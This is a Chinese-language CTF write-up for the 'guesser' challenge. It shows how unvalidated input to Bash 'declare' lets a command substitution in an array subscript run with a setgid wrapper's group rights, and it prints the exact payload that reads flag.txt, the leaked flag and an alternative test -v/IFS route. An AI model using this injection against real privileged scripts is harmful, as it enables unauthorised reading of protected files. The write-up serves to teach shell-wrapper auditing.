# guesser

## 题目简述

服务提供受限 Bash 环境和一个带 linus 组权限的 setgid 包装程序 run。它最终调用 guess 脚本比较用户猜测与相对路径 secret 的内容；flag.txt 只允许 root 和 linus 组读取。

guess 在最开头执行：

~~~bash
declare "${2}"=X
~~~

第二个参数未经验证就进入 Bash 的 declare。数组下标处于算术求值上下文，能够触发命令替换，因此这里已经形成权限边界逃逸。

## 解题过程

Bash 在处理形如 arr[index] 的变量名时，会把 index 当作算术表达式求值。若下标中含有命令替换，命令会在 setgid 包装程序继承的有效组权限下执行。

直接把第二个参数设置为：

~~~bash
x[$(cat flag.txt)]
~~~

完整调用为：

~~~bash
./run _ 'x[$(cat flag.txt)]'
~~~

进入 guess 后，实际语句相当于：

~~~bash
declare 'x[$(cat flag.txt)]'=X
~~~

cat 因有效组为 linus 而能读取 flag.txt。读取结果随后被放入数组下标的算术表达式；flag 中不是合法算术语法的部分会出现在 Bash 错误信息里，于是无需正常输出通道也能泄露内容：

~~~text
shellmates{W3_H4v3_a_B4SH_G3niu5_RIG|-|7_H3R3}
~~~

官方说明还给出一条更接近预期设计的路线：利用 secret 是相对路径，在可写目录创建内容为 `-v array[$(cat /home/ctf/flag.txt)]` 的假 secret，再借 test 的 -v 选项与 IFS 分词触发数组下标求值。但当前源码中的 declare 注入更短，也正是官方记录的非预期解。

## 方法总结

Bash 的危险点不只在 eval。declare、test -v、算术扩展和数组下标都可能对输入做第二次解释，并在下标中执行命令替换。审计 setuid/setgid Shell 包装器时，应把每个“变量名”和“数组索引”都视为潜在代码边界；同时检查相对路径、IFS 和错误回显，因为它们常把一次盲执行转成直接信息泄露。
